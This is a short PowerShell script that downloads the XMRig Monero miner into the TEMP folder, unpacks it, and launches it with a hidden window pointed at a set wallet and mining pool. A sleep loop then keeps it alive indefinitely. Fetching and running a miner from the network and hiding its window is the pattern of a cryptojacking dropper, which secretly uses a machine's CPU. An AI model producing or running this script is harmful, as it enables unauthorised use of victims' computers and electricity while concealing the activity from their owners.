# Mining configuration
$wallet = "8Ar9qwqFkxm62LEpv22FV9hqyBoc2Rjk5eayni9QKhasHLSKysm1Z9pcggo6VvJGs8eY1GDziQZnAVpLnL582N3CMsEErDb"  # Your Monero address
$pool = "stratum+tcp://pool.supportxmr.net:5555"  # SupportXMR pool
$algorithm = "randomx"  # Monero's algorithm

# Download XMRig (Monero miner)
Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/latest/download/xmrig-v6.20.0-win-x64.zip" -OutFile "$env:TEMP\xmrig.zip"
Expand-Archive "$env:TEMP\xmrig.zip" -DestinationPath "$env:TEMP\xmrig" -Force

# Start mining process
Start-Process -FilePath "$env:TEMP\xmrig\xmrig.exe" -ArgumentList "--url $pool --user $wallet --cpu" -WindowStyle Hidden

# Keep process running
while ($true) {
    Start-Sleep -Seconds 3600
}
